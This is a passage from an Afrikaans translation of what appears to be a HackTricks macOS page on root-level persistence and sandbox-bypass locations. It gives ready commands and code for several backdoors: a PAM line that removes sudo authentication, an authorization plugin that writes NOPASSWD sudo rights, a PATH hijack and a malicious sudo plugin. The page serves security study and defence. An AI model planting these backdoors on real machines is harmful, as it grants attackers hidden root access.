  - Word uitgevoer wanneer die betrokke Python-interpreter met daardie werf-gids geaktiveer, begin; die sneller is nie universeel oor virtuele omgewings, Python-bouweergawes of opstartvlae heen nie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Word uitgevoer met die voorregte/TCC van die proses wat ook al die interpreter begin het

#### Ligging

- **`$(python3 -m site --user-site)/*.pth`** (macOS-raamwerkbouweergawes: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Geen root nodig nie (skryfbaar deur gebruiker)
  - **Sneller**: begin van daardie Python-bouweergawe met sy gebruikerswerf geaktiveer; die `site`-module verwerk `.pth`-lêers in aktiewe werf-gidse
- **`<user-site>/usercustomize.py`**
  - Geen root nodig nie
  - **Sneller**: begin met die gebruikerswerf geaktiveer (word outomaties deur `site` ingevoer)
- **`<prefix>/site-packages/sitecustomize.py`** (bv. `/opt/homebrew/lib/python3.13/site-packages/`, of stelselpaaie)
  - Root/admin mag nodig wees, afhangend van die ligging van die interpreter
  - **Sneller**: begin van ’n interpreter wat daardie werf-gids insluit

#### Beskrywing & uitbuiting

By opstart voer Python normaalweg `site` in en deursoek sy aktiewe `site-packages`-gidse vir `.pth`-lêers. Behalwe om paaie by te voeg, voer ’n `.pth`-reël wat met `import ` begin Python-kode uit, selfs al word die genoemde module nie andersins gebruik nie. Python probeer ook om `sitecustomize` en, **wanneer die gebruikerswerf geaktiveer is**, `usercustomize` in te voer.<sup>[[56]](#references)</sup> Die sneller is ’n latere begin van ’n interpreter wat die gewysigde gids sien. `-S` deaktiveer `site`-verwerking; `-s`, `-I` of `PYTHONNOUSERSITE` deaktiveer die **gebruikerswerf**-variante. `-I` deaktiveer oor die algemeen nie ’n globale `sitecustomize` nie. Virtuele omgewings kan ook die gebruikerswerf uitsluit. Gaan `python3 -m site` na vir die spesifieke interpreter.

Die volgende PoC is op macOS 26.5.2 uitgevoer. `PYTHONUSERBASE` verskuif die gebruikerswerf na ’n tydelike gids vir hierdie toets; geen werklike gebruikerswerf word gewysig nie:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Albei merkers het verskyn. Deur die toets met `-s`, `-I` of `-S` te herhaal, is albei **user-site**-merkers voorkom. `sitecustomize` in ’n globale site-gids is nie getoets nie.

## Root Sandbox Bypass

> [!TIP]
> Hier kan jy beginplekke vind wat nuttig is vir **sandbox bypass** en jou toelaat om iets eenvoudig uit te voer deur dit **in ’n lêer te skryf** terwyl jy **root** is en/of ander **vreemde voorwaardes** vereis word.

### Periodic

> [!CAUTION]
> **Historiese meganisme:** Op die macOS 26.5.2-toetsmasjien ontbreek `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` en die `com.apple.periodic-*` launch daemons. Moenie aanvaar dat die skep van `/etc/periodic` op ’n huidige stelsel die inhoud daarvan sal skeduleer nie. Kontroleer of sowel die opdrag as ’n geaktiveerde skeduleerder op die teikenweergawe beskikbaar is voordat jy die voorbeeld hieronder gebruik.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nuttig om sandbox bypass te doen: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root word vereis
  - **Sneller**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
  - Root word vereis
  - **Sneller**: Wanneer die tyd aanbreek

#### Beskrywing & Exploitation

Op ouer weergawes is die periodic-skripte (**`/etc/periodic`**) deur **launch daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*` geskeduleer. Vanaf macOS Big Sur 11.5 het die periodic-runner die skripte in die periodic-gidse as die **eienaar van elke lêer** uitgevoer, wat ’n vorige privilege-escalation-roete gesluit het.<sup>[[27]](#references)</sup> Die opdragte en gidslysinskrywings hieronder is historiese uitvoer, nie ’n macOS 26.5.2-toetsresultaat nie.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Daar is ander periodieke skrifte wat uitgevoer sal word, aangedui in **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Op ouer stelsels waarop `periodic` en sy launch daemons geïnstalleer en geaktiveer is, was `/etc/daily.local`, `/etc/weekly.local` en `/etc/monthly.local` bykomende uitvoeringspaaie. ’n Skadelose leesalleen-kontrole is:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Die eienaargebaseerde reël is toegepas op skrifte wat direk in die periodieke gidse geplaas is. Die historiese `999.local`-omhulsel het vroeër `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` gelaai sonder dieselfde eienaarskapkontrole; wanneer die skeduleerder as root geloop het, het hierdie plaaslike lêers as root geloop. Hierdie onderskeid en die verandering in Big Sur 11.5 word in die [oorspronklike navorsing](https://theevilbit.github.io/beyond/beyond_0019/) gedokumenteer. Daar moet nie aanvaar word dat enige van hierdie paaie aktief is wanneer `periodic` ontbreek nie.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root word altyd vereis

#### Beskrywing & Uitbuiting

Aangesien PAM meer op **volharding** en malware fokus as op maklike uitvoering binne macOS, gee hierdie blog nie ’n gedetailleerde verduideliking nie; **lees die writeups om hierdie tegniek beter te verstaan**.<sup>[[28]](#references)</sup>

Kontroleer PAM-modules met:

```bash
ls -l /etc/pam.d
```

’n Volhardings-/voorregte-eskalasietegniek wat PAM misbruik, is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en die volgende reël aan die begin by te voeg:

```bash
auth       sufficient     pam_permit.so
```

Dit sal dus **lyk soos** iets soos hierdie:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

En daarom sal enige poging om **`sudo` te gebruik werk**.

> [!CAUTION]
> Let daarop dat hierdie gids deur TCC beskerm word, so dit is baie waarskynlik dat die gebruiker ’n versoek sal kry om toegang toe te staan.

Nog ’n goeie voorbeeld is `su`, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM-modules te gee (en jy kan ook hierdie lêer backdoor):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en ekstra konfigurasies maak
- TCC-omseiling: ???

#### Ligging

- `/Library/Security/SecurityAgentPlugins/`
  - Root word vereis
  - Jy moet ook die authorization-databasis opstel om die plugin te gebruik

#### Beskrywing en uitbuiting

Jy kan ’n authorization-plugin skep wat uitgevoer word wanneer ’n gebruiker aanmeld om persistence te behou. Vir meer inligting oor hoe om een van hierdie plugins te skep, raadpleeg die vorige writeups (en wees versigtig: ’n swakgeskrewe een kan jou uitsluit, waarna jy jou Mac vanuit recovery mode sal moet skoonmaak).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Skuif** die bundel na die ligging waar dit gelaai moet word:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Voeg laastens die **reël** by om hierdie Plugin te laai:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

Die **`evaluate-mechanisms`** sal die magtigingsraamwerk laat weet dat dit **’n eksterne meganisme vir magtiging sal moet aanroep**. Boonop sal **`privileged`** dit as root laat uitvoer.

Aktiveer dit met:

```bash
security authorize com.asdf.asdf
```

En dan behoort die **staff-groep sudo**-toegang te hê (lees `/etc/sudoers` om dit te bevestig).

### Man.conf

Beskrywing: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en die gebruiker moet man gebruik
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/private/etc/man.conf`**
  - Root word vereis
  - **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing & Exploit

Die konfigurasielêer **`/private/etc/man.conf`** dui die binary/script aan wat gebruik moet word wanneer man-dokumentasielêers oopgemaak word. Die pad na die executable kan dus gewysig word sodat ’n backdoor uitgevoer word wanneer die gebruiker man gebruik om dokumentasie te lees.<sup>[[31]](#references)</sup>

Stel byvoorbeeld die volgende in **`/private/etc/man.conf`** in:

```
MANPAGER /tmp/view
```

En skep dan `/tmp/view` soos volg:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en apache moet loop
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd het nie entitlements nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
  - Root word vereis
  - Sneller: Wanneer Apache2 begin word

#### Beskrywing & Exploit

Jy kan in `/etc/apache2/httpd.conf` aandui dat ’n module gelaai moet word deur ’n reël by te voeg soos:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Op hierdie manier sal jou saamgestelde module deur Apache gelaai word. Die enigste ding is dat jy dit óf met 'n geldige Apple-sertifikaat moet **onderteken**, óf 'n nuwe vertroude sertifikaat by die stelsel moet **voeg** en dit daarmee moet **onderteken**.

Dan kan jy, indien nodig, die volgende uitvoer om seker te maak dat die bediener begin:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Kodevoorbeeld vir die Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM-ouditraamwerk

Skrywe: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees, auditd moet loop en ’n waarskuwing veroorsaak
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
  - Root word vereis
  - **Sneller**: Wanneer auditd ’n waarskuwing bespeur

#### Beskrywing en uitbuiting

Wanneer auditd ’n waarskuwing bespeur, word die script **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou payload daarby voeg.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Jy kan ’n waarskuwing afdwing met `sudo audit -n`.

### Opstartitems

> [!CAUTION] > **Dit is afgekeur, dus behoort daar niks in daardie gidse gevind te word nie.**

Die **StartupItem** is ’n gids wat binne óf `/Library/StartupItems/` óf `/System/Library/StartupItems/` geplaas moet word. Sodra hierdie gids geskep is, moet dit twee spesifieke lêers bevat:

1. ’n **rc script**: ’n Shell script wat tydens opstart uitgevoer word.
2. ’n **plist-lêer**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Maak seker dat beide die rc script en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan nie hierdie komponent in my macOS vind nie, so kyk na die writeup vir meer inligting

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond**, wat deur Apple bekendgestel is, is ’n logmeganisme wat onderontwikkel of moontlik laat vaar lyk, maar steeds toeganklik is. Hoewel dit nie besonder nuttig vir ’n Mac-administrateur is nie, kan hierdie obskure diens as ’n subtiele volhardingsmetode vir bedreigingsakteurs dien, waarskynlik sonder dat die meeste macOS-administrateurs dit opmerk.<sup>[[34]](#references)</sup>

Vir diegene wat weet dat dit bestaan, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek na skripte om in ’n enkele gids uit te voer. Die volgende opdrag kan gebruik word om dit te ondersoek:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root word vereis
  - **Sneller**: Met XQuartz

#### Beskrywing & Uitbuiting

XQuartz word **nie meer in macOS geïnstalleer nie**, so kyk na die writeup as jy meer inligting wil hê.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Die installering van ’n kext is so ingewikkeld, selfs as root, dat dit nie as ’n praktiese sandbox-escape- of persistence-tegniek beskou word tensy jy ’n exploit het nie.

#### Ligging

Om ’n KEXT as ’n opstartitem te installeer, moet dit **op een van die volgende liggings geïnstalleer word**:

- `/System/Library/Extensions`
  - KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
- `/Library/Extensions`
  - KEXT-lêers wat deur derdeparty-sagteware geïnstalleer is.

Jy kan tans gelaaide kext-lêers lys met:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Vir meer inligting oor [**kernel extensions, kyk na hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Ligging

- **`/usr/local/bin/amstoold`**
  - Root word vereis

#### Beskrywing & uitbuiting

Blykbaar het die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik terwyl dit 'n XPC-diens blootgestel het... die ding is dat die binary nie bestaan het nie, dus kon jy iets daar plaas, en wanneer die XPC-diens geroep word, sou jou binary geroep word.<sup>[[35]](#references)</sup>

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Ligging

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root word vereis
  - **Sneller**: Wanneer die diens uitgevoer word (selde)

#### Beskrywing & uitbuiting

Blykbaar is dit nie baie algemeen om hierdie script uit te voer nie, en ek kon dit nie eens in my macOS vind nie. Kyk dus na die writeup as jy meer inligting wil hê.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS-weergawes nie**

Dit is ook moontlik om **opdragte wat tydens opstart uitgevoer sal word** hier te plaas. Voorbeeld van 'n gewone rc.common-script:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd-opstarttake

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root vereis)
- Root word vereis, plus óf ’n **SIP-omseiling** óf die **`kTCCServiceSystemPolicySysAdminFiles`**-/Full Disk Access-toestemming, afhangend van die pad

#### Ligging

`launchd` bevat ’n plist in sy **`__TEXT,__config`**-afdeling wat vroeë "opstarttake" beskryf. Verskeie verwysingskripte/-binaries wat **nie** by verstek bestaan nie, maar deur ’n aanvaller geskep kan word:

- SIP-omseilingstel: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA-stel: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` bestaan vooraf slegs op Sequoia+)

#### Beskrywing en uitbuiting

Dump die ingebedde taakkabel om te sien watter lêers `launchd` sal uitvoer en watter sleutels ondersteun word (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Deur een van die verwysde lêers (bv. `/etc/rc.server`) te skep, laat `launchd` dit tydens die volgende (userspace-)herlaai uitvoer. Die nuttigste inskrywings word deur SIP beperk of vereis TCC SysAdminFiles/Full Disk Access, so dit is ’n tegniek op root-vlak wat deur ’n herlaai geaktiveer word.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Beskrywing: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Die `rc.trampoline`-selflaaitaak voer tydens selflaai ’n **platform (Apple-ondertekende) binêre lêer** uit wat in die `apple-trusted-trampoline`-NVRAM-veranderlike gestoor is, maar **slegs wanneer die `rc.trampoline=1`-selflaai-argument gestel is en SIP gedeaktiveer is** (met ’n groottebeperking van ongeveer 390&nbsp;KB en ’n beperking wat vereis dat die program vinnig blokkeer/terugkeer). Omdat dit **root + gedeaktiveerde SIP + ’n Apple-ondertekende loonvrag** vereis, is dit in die praktyk onbruikbaar vir volharding in die werklike wêreld en word dit hier slegs vir volledigheid gelys.<sup>[[41]](#references)</sup>

### /etc/paths en /etc/paths.d (PATH hijack)

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root is nodig om te skryf)
- Root vereis

#### Ligging

- **`/etc/paths`** en **`/etc/paths.d/*`** — word deur **`path_helper`** gelees (wat vanaf `/etc/zprofile` aangeroep word) om die verstek-`PATH` by aanmelding saam te stel.

#### Beskrywing en uitbuiting

Albei is root-besit. Deur ’n aanvallerbeheerde gids vooraan te plaas (deur `/etc/paths` te wysig of ’n lêer in `/etc/paths.d/` te plaas), verskyn daardie gids vroeg in die `PATH` van elke nuwe aanmeldingshell. ’n Kwaadwillige binêre lêer met die naam van ’n algemene opdrag (`ls`, `git`, …) **oorskadu** dan die regte een en loop wanneer die slagoffer dit die volgende keer aanroep.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Verslag: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Nuttig om sandbox te bypass: [🔴](https://emojipedia.org/large-red-circle) (root word vereis)
- Root word vereis; die resultaat **bypass SIP**. Geaffekteerde macOS **15.0–15.1**, reggestel in **15.2**

#### Ligging

- Plaas ’n filesystem bundle in **`/Library/Filesystems/`**.

#### Beskrywing & Uitbuiting

`storagekitd` het die entitlement **`com.apple.rootless.install.heritable`** en het die binaries van filesystem bundles met daardie SIP-bypass-vermoë **geërf** laat loop. Deur ’n kwaadwillige filesystem bundle te plaas, kon ’n aanvaller kode met ’n SIP-bypass laat loop om **volgehoue kernel extensions** te installeer of na SIP-beskermde `LaunchDaemon`-gidse te skryf — volharding wat normale beskermings oorleef en uitoorlê.<sup>[[46]](#references)</sup> Apple het dit in macOS Sequoia 15.2 reggestel.

### sudo-plugins (/etc/sudo.conf)

Verslag: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Nuttig om sandbox te bypass: [🔴](https://emojipedia.org/large-red-circle) (root word vereis om `/etc/sudo.conf` te skryf)
- Root word vereis om dit te installeer; die plugin loop dan binne **elke `sudo`-aanroeping** (setuid-root-konteks)

#### Ligging

- **`/etc/sudo.conf`** — `Plugin`-reëls laai shared objects vanaf **`/usr/libexec/sudo/`** (of ’n absolute pad). Dit bestaan nie by verstek nie (sudo gebruik ’n ingeboude beleid), dus is dit skoon om dit te skep as ’n hook.

#### Beskrywing & Uitbuiting

`sudo` laai sy beleid-/goedkeurings-/oudit-plugins vanaf `/etc/sudo.conf`. Omdat `sudo` setuid-root is, loop ’n kwaadwillige shared-object-plugin met **root-voorregte elke keer wanneer enige gebruiker `sudo` laat loop** — volhoubare root-volharding wat ook elke sudo-opdrag kan sien.<sup>[[51]](#references)</sup> macOS word met sudo 1.9.x gelewer, wat die plugin-API ondersteun.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Skrywe: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimale voorbeeld: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Verouderde meganisme:** Afgeskaf sedert macOS 12.3. macOS 14.1 en later deaktiveer verouderde video-plug-ins by verstek. ’n Gebruiker moet verouderde video-ondersteuning vanuit Recovery herstel voordat hierdie metode kan werk; ’n skryfbare gids alleen is nie genoeg nie. [Apple se huidige ondersteuningsriglyne](https://support.apple.com/en-us/108387).
- Root is nodig om na die plug-in-gids te skryf. Enige kode-uitvoering hang af van ’n versoenbare kliënt wat steeds DAL plug-ins laai; dit is nie tydens looptyd op macOS 26 getoets nie.

#### Ligging

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root is nodig
  - **Sneller:** ’n Versoenbare kamerakliënt lys toestelle op **nadat verouderde ondersteuning herstel is**. Kliëntbiblioteekvalidering kan ’n derdeparty-plug-in blokkeer.

#### Beskrywing & Uitbuiting

CoreMediaIO **DAL** (Device Abstraction Layer)-plug-ins is deur sommige kamera-toepassings in-proses gelaai. Apple se [aanbieding oor kamera-uitbreidings](https://developer.apple.com/videos/play/wwdc2022/10022/) sê spesifiek dat verouderde DAL plug-ins **nie** met FaceTime, QuickTime Player of Photo Booth gewerk het nie, en dat baie ander kliënte biblioteekvalidering afdwing. Moderne [Core Media I/O-uitbreidings](https://developer.apple.com/documentation/coremediaio) loop buite die proses, met ’n afsonderlike installasie- en goedkeuringsmodel. Die historiese in-proses-tegniek impliseer nie ’n algemene Camera TCC-omseiling op huidige macOS nie.<sup>[[53]](#references)[[54]](#references)</sup>

Leesalleen-waarneming op macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` bestaan en word deur root besit. Nóg verouderde ondersteuning nóg laai in enige kliënt is geverifieer.

### Directory Service Plugins

